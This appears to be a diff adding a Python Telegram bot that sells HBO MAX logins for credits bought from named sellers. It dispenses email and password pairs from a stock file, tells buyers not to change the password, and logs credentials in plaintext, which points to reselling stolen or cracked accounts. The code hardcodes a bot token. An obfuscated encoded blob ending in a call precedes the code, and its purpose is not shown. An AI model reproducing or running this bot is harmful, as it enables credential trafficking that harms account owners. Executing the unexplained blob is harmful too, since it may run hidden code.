Kj/wDE4UuTnY7g1OZEoeCu+8NFvcqY8/GkI9gMwhVjMtyx252FM/47MGdgHMz+EpaeGmAFTNyt8NshjKzEMizTef3iF/I5pgs4h1VwMT6FSn0dOLj/+3jAofYBhbajC6pjxLmFHzyBbhYCnAqrw2M9dZJX+8YY9qthTOByDo9VPxU9Va28W9h/y10n65UOUM0bhX9IzRhwPQ3vFrAvPvCL73knGEuPySST0KtRTQXlze01BzBQyEs6biE2UaNxf/yMQS+I2QygorcGN0slkpscTgE7Bx4h7DO2HrQnPT43AJeaHKajrcLgElJNRolX7qQGEtpZZQQoYjh7jnsIfXkGXVhcDlfcBsa4dIh8u16geGVTdADRJjWurj+wDnfCOtibzDUskYt2SszePiZt4s5Ejzb/7OdolQglYWA4IttYzJ5wGkJRseFy4FwFMhjwSVQYFKPqLVyScjxz/BV+Y+LMjFofQVVBWUlBkcDo/33rv/O7/f/2///ZeXljzQcYetvHHCCQ7766tvcaeKY6hbzRxcFI8pwglNH/TRWY96uermdwJe'))
+import logging
+import json
+import os
+from datetime import datetime
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
+from telegram.constants import ParseMode
+
+# ============================================
+TOKEN = "8670158841:AAEjW_2Vcx_cNpwpA_iE0dLOErfJw7Sd534"  # <--- TU TOKEN
+PROPIETARIO_ID = 8651211925  # <--- TU ID
+# ============================================
+
+# Configurar logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
+
+# Estados para las conversaciones
+(AGREGAR_USUARIO_ID, AGREGAR_USUARIO_CREDITOS, 
+ AGREGAR_CUENTA_CORREO, AGREGAR_CUENTA_CONTRASENA, AGREGAR_CUENTA_PAIS, AGREGAR_CUENTA_PLAN,
+ RECARGAR_CREDITOS_ID, RECARGAR_CREDITOS_CANTIDAD,
+ ELIMINAR_USUARIO_ID, CONFIRMAR_ELIMINACION) = range(10)
+
+# Archivos JSON (SOLO HBO)
+ARCHIVOS = {
+    'hbo': 'hbo.json',
+    'admin': 'admin.json',
+    'users': 'users.json',
+    'entregas': 'entregas.json'
+}
+
+# Precio HBO
+PRECIO_HBO = 80
+
+# Inicializar archivos
+def inicializar_archivos():
+    for archivo in ARCHIVOS.values():
+        if not os.path.exists(archivo):
+            if archivo == 'admin.json':
+                with open(archivo, 'w') as f:
+                    json.dump([PROPIETARIO_ID], f)
+                print(f"✅ Archivo {archivo} creado con tu ID")
+            elif archivo == 'users.json':
+                with open(archivo, 'w') as f:
+                    json.dump({}, f)
+                print(f"✅ Archivo {archivo} creado")
+            elif archivo == 'entregas.json':
+                with open(archivo, 'w') as f:
+                    json.dump([], f)
+                print(f"✅ Archivo {archivo} creado")
+            else:
+                with open(archivo, 'w') as f:
+                    json.dump([], f)
+                print(f"✅ Archivo {archivo} creado")
+
+# Verificar si es admin
+def es_admin(user_id):
+    try:
+        with open('admin.json', 'r') as f:
+            admins = json.load(f)
+        return user_id in admins
+    except:
+        return False
+
+# Verificar si es propietario
+def es_propietario(user_id):
+    return user_id == PROPIETARIO_ID
+
+# Verificar si es VIP (tiene créditos)
+def es_vip(user_id):
+    try:
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        return str(user_id) in users and users[str(user_id)]['creditos'] > 0
+    except:
+        return False
+
+# Obtener créditos
+def obtener_creditos(user_id):
+    try:
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        return users.get(str(user_id), {}).get('creditos', 0)
+    except:
+        return 0
+
+# Verificar stock HBO
+def verificar_stock_hbo():
+    try:
+        with open('hbo.json', 'r') as f:
+            cuentas = json.load(f)
+        return len(cuentas)
+    except:
+        return 0
+
+# Registrar entrega
+def registrar_entrega(user_id, user_name, cuenta):
+    try:
+        with open('entregas.json', 'r') as f:
+            entregas = json.load(f)
+        
+        registro = {
+            'user_id': user_id,
+            'user_name': user_name,
+            'plataforma': 'HBO MAX',
+            'correo': cuenta['correo'],
+            'contraseña': cuenta['contraseña'],
+            'pais': cuenta['pais'],
+            'plan': cuenta['plan'],
+            'fecha': str(datetime.now()),
+            'creditos_gastados': PRECIO_HBO
+        }
+        
+        entregas.append(registro)
+        
+        with open('entregas.json', 'w') as f:
+            json.dump(entregas, f, indent=2)
+        
+        return True
+    except Exception as e:
+        print(f"Error registrando entrega: {e}")
+        return False
+
+# Obtener últimas entregas
+def obtener_ultimas_entregas(user_id, limite=3):
+    try:
+        with open('entregas.json', 'r') as f:
+            entregas = json.load(f)
+        
+        entregas_usuario = [e for e in entregas if e['user_id'] == user_id]
+        return entregas_usuario[-limite:] if entregas_usuario else []
+    except:
+        return []
+
+# ==================== COMANDOS ====================
+
+# /start
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    user_name = user.first_name if user.first_name else "Usuario"
+    
+    welcome_message = f"""
+╔══════════════════════════════╗
+║   🔥 H I T S C O L  H B O 🔥   ║
+╚══════════════════════════════╝
+
+🔰 ACCESO CONCEDIDO, {user_name.upper()}
+
+🎬 PLATAFORMA DISPONIBLE:
+    └─ HBO MAX
+
+💰 COSTO POR CUENTA: 80 CRÉDITOS
+
+📦 PAQUETES:
+    ├─ 80 CRÉDITOS → 5000 COP / 1.63 USD
+    └─ 200 CRÉDITOS → 10000 COP / 2.90 USD
+
+⚡ USA /cmd PARA COMANDOS
+"""
+    await update.message.reply_text(welcome_message)
+
+# /cmd
+async def cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    comandos_basicos = """
+📟 COMANDOS DISPONIBLES:
+
+🔹 PÚBLICOS:
+/start - Iniciar bot
+/cmd - Este menú
+/id - Tu ID
+/comprar - Comprar créditos
+/sellers - Contactar vendedores
+
+🔸 VIP (con créditos):
+/sacarcuenta - Obtener HBO MAX
+/status - Ver mi estado
+/misentregas - Mi historial
+"""
+    
+    comandos_admin = """
+🔹 ADMIN:
+/agregar_usuario - Agregar usuario
+/recargar_creditos - Recargar créditos
+/agregar_cuenta - Agregar cuenta HBO
+/eliminar_usuario - Eliminar usuario
+/ver_usuarios - Ver usuarios
+/ver_cuentas - Ver stock
+/ver_entregas - Ver entregas
+/ver_cuenta_entregada - Ver detalles
+/exportar - Respaldar datos
+"""
+    
+    if es_propietario(user_id) or es_admin(user_id):
+        mensaje = comandos_basicos + comandos_admin
+    elif es_vip(user_id):
+        mensaje = comandos_basicos
+    else:
+        mensaje = comandos_basicos
+    
+    await update.message.reply_text(mensaje)
+
+# /id
+async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    await update.message.reply_text(f"🆔 TU ID: `{user_id}`", parse_mode=ParseMode.MARKDOWN)
+
+# /comprar
+async def comprar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    mensaje = """
+💰 PAQUETES DE CRÉDITOS:
+
+🎯 PAQUETE BÁSICO:
+80 CRÉDITOS → 5000 COP / 1.63 USD
+
+🎯 PAQUETE PREMIUM:
+200 CRÉDITOS → 10000 COP / 2.90 USD
+
+✨ CARACTERÍSTICAS:
+• Créditos sin caducidad
+• Válidos solo para HBO MAX
+• Entrega inmediata
+
+📞 CONTACTA /sellers
+"""
+    await update.message.reply_text(mensaje)
+
+# /sellers
+async def sellers(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    mensaje = """
+👥 VENDEDORES AUTORIZADOS:
+
+@Guuason - Nequi/Binance
+@El_krat0s - Nequi/Binance
+@F3NIS - Nequi/Binance
+
+⚠️ SOLO COMPRAR CON ELLOS
+"""
+    await update.message.reply_text(mensaje)
+
+# /status
+async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    user_name = update.effective_user.first_name or "Usuario"
+    
+    if not es_vip(user_id):
+        await update.message.reply_text("❌ No tienes créditos. Usa /comprar")
+        return
+    
+    creditos = obtener_creditos(user_id)
+    ultimas = obtener_ultimas_entregas(user_id, 3)
+    
+    mensaje = f"""
+📊 ESTADO DE {user_name}:
+
+💰 CRÉDITOS: {creditos}
+
+📋 ÚLTIMAS EXTRACCIONES:
+"""
+    
+    if ultimas:
+        for e in ultimas:
+            mensaje += f"""
+🎬 HBO MAX
+📧 {e['correo']}
+📅 {e['fecha'][:19]}
+"""
+    else:
+        mensaje += "\n📭 Sin extracciones"
+    
+    await update.message.reply_text(mensaje)
+
+# /misentregas
+async def mis_entregas(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    try:
+        with open('entregas.json', 'r') as f:
+            entregas = json.load(f)
+        
+        mis_entregas = [e for e in entregas if e['user_id'] == user_id]
+        
+        if not mis_entregas:
+            await update.message.reply_text("📭 No tienes entregas registradas")
+            return
+        
+        mensaje = "📋 HISTORIAL COMPLETO:\n\n"
+        for e in mis_entregas:
+            mensaje += f"""
+🎬 HBO MAX
+📧 {e['correo']}
+🔑 {e['contraseña']}
+📅 {e['fecha'][:19]}
+{'='*30}
+"""
+        
+        await update.message.reply_text(mensaje)
+    except:
+        await update.message.reply_text("❌ Error al obtener historial")
+
+# /sacarcuenta
+async def sacarcuenta(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    
+    if not es_vip(user_id):
+        await update.message.reply_text("❌ No tienes créditos. Usa /comprar")
+        return
+    
+    creditos = obtener_creditos(user_id)
+    stock = verificar_stock_hbo()
+    
+    if creditos < PRECIO_HBO:
+        await update.message.reply_text(f"❌ Créditos insuficientes\nNecesitas: {PRECIO_HBO}\nTienes: {creditos}")
+        return
+    
+    if stock <= 0:
+        await update.message.reply_text("❌ Sin stock de HBO MAX\nPronto agregaremos más")
+        return
+    
+    try:
+        with open('hbo.json', 'r') as f:
+            cuentas = json.load(f)
+        
+        cuenta = cuentas.pop(0)
+        
+        with open('hbo.json', 'w') as f:
+            json.dump(cuentas, f)
+        
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        users[str(user_id)]['creditos'] -= PRECIO_HBO
+        
+        with open('users.json', 'w') as f:
+            json.dump(users, f)
+        
+        registrar_entrega(user_id, update.effective_user.first_name or "Usuario", cuenta)
+        
+        mensaje = f"""
+✅ EXTRACCIÓN EXITOSA
+
+🎬 HBO MAX
+📧 {cuenta['correo']}
+🔑 {cuenta['contraseña']}
+🌍 {cuenta['pais']}
+📺 {cuenta['plan']}
+
+💰 Créditos restantes: {users[str(user_id)]['creditos']}
+
+⚠️ No cambiar contraseña
+"""
+        await update.message.reply_text(mensaje)
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+
+# ==================== ADMIN ====================
+
+# /agregar_usuario
+async def agregar_usuario_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return ConversationHandler.END
+    
+    await update.message.reply_text("📝 ID del usuario:")
+    return AGREGAR_USUARIO_ID
+
+async def agregar_usuario_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        context.user_data['target_id'] = int(update.message.text)
+        await update.message.reply_text("💰 Créditos a asignar:")
+        return AGREGAR_USUARIO_CREDITOS
+    except:
+        await update.message.reply_text("❌ ID inválido")
+        return AGREGAR_USUARIO_ID
+
+async def agregar_usuario_creditos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        creditos = int(update.message.text)
+        target_id = context.user_data['target_id']
+        
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        users[str(target_id)] = {
+            'creditos': creditos,
+            'fecha_registro': str(datetime.now())
+        }
+        
+        with open('users.json', 'w') as f:
+            json.dump(users, f)
+        
+        await update.message.reply_text(f"✅ Usuario {target_id} agregado con {creditos} créditos")
+        return ConversationHandler.END
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+        return ConversationHandler.END
+
+# /recargar_creditos
+async def recargar_creditos_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return ConversationHandler.END
+    
+    await update.message.reply_text("📝 ID del usuario:")
+    return RECARGAR_CREDITOS_ID
+
+async def recargar_creditos_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        context.user_data['target_id'] = int(update.message.text)
+        await update.message.reply_text("💰 Créditos a recargar:")
+        return RECARGAR_CREDITOS_CANTIDAD
+    except:
+        await update.message.reply_text("❌ ID inválido")
+        return RECARGAR_CREDITOS_ID
+
+async def recargar_creditos_cantidad(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        cantidad = int(update.message.text)
+        target_id = context.user_data['target_id']
+        
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        if str(target_id) in users:
+            users[str(target_id)]['creditos'] += cantidad
+        else:
+            users[str(target_id)] = {
+                'creditos': cantidad,
+                'fecha_registro': str(datetime.now())
+            }
+        
+        with open('users.json', 'w') as f:
+            json.dump(users, f)
+        
+        await update.message.reply_text(f"✅ {cantidad} créditos recargados a {target_id}")
+        return ConversationHandler.END
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+        return ConversationHandler.END
+
+# /agregar_cuenta
+async def agregar_cuenta_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return ConversationHandler.END
+    
+    await update.message.reply_text("📧 Correo de HBO MAX:")
+    return AGREGAR_CUENTA_CORREO
+
+async def agregar_cuenta_correo(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['correo'] = update.message.text
+    await update.message.reply_text("🔑 Contraseña:")
+    return AGREGAR_CUENTA_CONTRASENA
+
+async def agregar_cuenta_contrasena(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['contrasena'] = update.message.text
+    await update.message.reply_text("🌍 País:")
+    return AGREGAR_CUENTA_PAIS
+
+async def agregar_cuenta_pais(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data['pais'] = update.message.text
+    await update.message.reply_text("📺 Plan:")
+    return AGREGAR_CUENTA_PLAN
+
+async def agregar_cuenta_plan(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        with open('hbo.json', 'r') as f:
+            cuentas = json.load(f)
+        
+        nueva_cuenta = {
+            'correo': context.user_data['correo'],
+            'contraseña': context.user_data['contrasena'],
+            'pais': context.user_data['pais'],
+            'plan': context.user_data['plan']
+        }
+        
+        cuentas.append(nueva_cuenta)
+        
+        with open('hbo.json', 'w') as f:
+            json.dump(cuentas, f)
+        
+        await update.message.reply_text(f"✅ Cuenta HBO agregada\nStock actual: {len(cuentas)}")
+        return ConversationHandler.END
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+        return ConversationHandler.END
+
+# /eliminar_usuario
+async def eliminar_usuario_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return ConversationHandler.END
+    
+    await update.message.reply_text("🗑️ ID del usuario a eliminar:")
+    return ELIMINAR_USUARIO_ID
+
+async def eliminar_usuario_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        target_id = int(update.message.text)
+        
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        if str(target_id) not in users:
+            await update.message.reply_text("❌ Usuario no existe")
+            return ConversationHandler.END
+        
+        context.user_data['eliminar_id'] = target_id
+        
+        keyboard = [
+            [InlineKeyboardButton("✅ SI", callback_data="conf_si"),
+             InlineKeyboardButton("❌ NO", callback_data="conf_no")]
+        ]
+        
+        await update.message.reply_text(
+            f"¿Eliminar usuario {target_id}?",
+            reply_markup=InlineKeyboardMarkup(keyboard)
+        )
+        return CONFIRMAR_ELIMINACION
+        
+    except:
+        await update.message.reply_text("❌ ID inválido")
+        return ELIMINAR_USUARIO_ID
+
+async def eliminar_usuario_confirmar(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == "conf_si":
+        target_id = context.user_data['eliminar_id']
+        
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        del users[str(target_id)]
+        
+        with open('users.json', 'w') as f:
+            json.dump(users, f)
+        
+        await query.edit_message_text(f"✅ Usuario {target_id} eliminado")
+    else:
+        await query.edit_message_text("✅ Cancelado")
+    
+    return ConversationHandler.END
+
+# /ver_usuarios
+async def ver_usuarios(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
+    try:
+        with open('users.json', 'r') as f:
+            users = json.load(f)
+        
+        if not users:
+            await update.message.reply_text("📭 No hay usuarios")
+            return
+        
+        mensaje = "👥 USUARIOS:\n"
+        total_creditos = 0
+        
+        for uid, data in users.items():
+            mensaje += f"\n🆔 {uid}\n💰 {data['creditos']} créditos\n📅 {data.get('fecha_registro', 'N/A')[:19]}\n"
+            total_creditos += data['creditos']
+        
+        mensaje += f"\n📊 Total créditos: {total_creditos}"
+        await update.message.reply_text(mensaje)
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error: {str(e)}")
+
+# /ver_cuentas
+async def ver_cuentas(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
+    stock = verificar_stock_hbo()
+    emoji = "✅" if stock > 0 else "❌"
+    await update.message.reply_text(f"{emoji} HBO MAX: {stock} cuentas\n💰 Precio: {PRECIO_HBO} créditos")
+
+# /ver_entregas
+async def ver_entregas(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
+    try:
+        with open('entregas.json', 'r') as f:
+            entregas = json.load(f)
+        
+        if not entregas:
+            await update.message.reply_text("📭 No hay entregas")
+            return
+        
+        mensaje = "📋 ÚLTIMAS 10 ENTREGAS:\n"
+        for e in entregas[-10:]:
+            mensaje += f"""
+👤 {e['user_name']} (ID: {e['user_id']})
+📧 {e['correo']}
+🔑 {e['contraseña']}
+📅 {e['fecha'][:19]}
+{'='*30}
+"""
+        
+        await update.message.reply_text(mensaje)
+    except:
+        await update.message.reply_text("❌ Error")
+
+# /ver_cuenta_entregada
+async def ver_cuenta_entregada(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
+    args = context.args
+    if not args:
+        await update.message.reply_text("❌ Usa: /ver_cuenta_entregada ID")
+        return
+    
+    try:
+        target_id = int(args[0])
+        
+        with open('entregas.json', 'r') as f:
+            entregas = json.load(f)
+        
+        entregas_usuario = [e for e in entregas if e['user_id'] == target_id]
+        
+        if not entregas_usuario:
+            await update.message.reply_text(f"📭 Usuario {target_id} sin entregas")
+            return
+        
+        mensaje = f"📋 HISTORIAL DE {target_id}:\n"
+        for e in entregas_usuario:
+            mensaje += f"""
+📧 {e['correo']}
+🔑 {e['contraseña']}
+📅 {e['fecha'][:19]}
+{'='*20}
+"""
+        
+        await update.message.reply_text(mensaje)
+    except:
+        await update.message.reply_text("❌ Error")
+
+# /exportar
+async def exportar_datos(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not (es_propietario(update.effective_user.id) or es_admin(update.effective_user.id)):
+        await update.message.reply_text("❌ No autorizado")
+        return
+    
+    await update.message.reply_text("📦 Función de exportación disponible en versión completa")
+
+# Manejador para comandos desconocidos
+async def unknown(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Comando no válido. Usa /cmd")
+
+# ==================== MAIN ====================
+
+def main():
+    print("=" * 50)
+    print("🔥 HITSCOL HBO MAX BOT v1.0 🔥")
+    print("=" * 50)
+    
+    inicializar_archivos()
+    
+    application = Application.builder().token(TOKEN).build()
+    
+    # ConversationHandlers
+    application.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('agregar_usuario', agregar_usuario_start)],
+        states={
+            AGREGAR_USUARIO_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_usuario_id)],
+            AGREGAR_USUARIO_CREDITOS: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_usuario_creditos)],
+        },
+        fallbacks=[]
+    ))
+    
+    application.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('recargar_creditos', recargar_creditos_start)],
+        states={
+            RECARGAR_CREDITOS_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, recargar_creditos_id)],
+            RECARGAR_CREDITOS_CANTIDAD: [MessageHandler(filters.TEXT & ~filters.COMMAND, recargar_creditos_cantidad)],
+        },
+        fallbacks=[]
+    ))
+    
+    application.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('agregar_cuenta', agregar_cuenta_start)],
+        states={
+            AGREGAR_CUENTA_CORREO: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_cuenta_correo)],
+            AGREGAR_CUENTA_CONTRASENA: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_cuenta_contrasena)],
+            AGREGAR_CUENTA_PAIS: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_cuenta_pais)],
+            AGREGAR_CUENTA_PLAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, agregar_cuenta_plan)],
+        },
+        fallbacks=[]
+    ))
+    
+    application.add_handler(ConversationHandler(
+        entry_points=[CommandHandler('eliminar_usuario', eliminar_usuario_start)],
+        states={
+            ELIMINAR_USUARIO_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, eliminar_usuario_id)],
+            CONFIRMAR_ELIMINACION: [CallbackQueryHandler(eliminar_usuario_confirmar)],
+        },
+        fallbacks=[]
+    ))
+    
+    # Comandos básicos
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("cmd", cmd))
+    application.add_handler(CommandHandler("id", id_command))
+    application.add_handler(CommandHandler("comprar", comprar))
+    application.add_handler(CommandHandler("sellers", sellers))
+    application.add_handler(CommandHandler("status", status))
+    application.add_handler(CommandHandler("sacarcuenta", sacarcuenta))
+    application.add_handler(CommandHandler("misentregas", mis_entregas))
+    
+    # Comandos admin
+    application.add_handler(CommandHandler("ver_usuarios", ver_usuarios))
+    application.add_handler(CommandHandler("ver_cuentas", ver_cuentas))
+    application.add_handler(CommandHandler("ver_entregas", ver_entregas))
+    application.add_handler(CommandHandler("ver_cuenta_entregada", ver_cuenta_entregada))
+    application.add_handler(CommandHandler("exportar", exportar_datos))
+    
+    # Manejador de comandos desconocidos
+    application.add_handler(MessageHandler(filters.COMMAND, unknown))
+    
+    print("✅ Bot iniciado correctamente")
+    print("📱 Esperando mensajes...")
+    
+    application.run_polling(allowed_updates=Update.ALL_TYPES)
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt:
+        print("\n🛑 Bot detenido")
+    except Exception as e:
+        print(f"\n❌ Error: {e}")
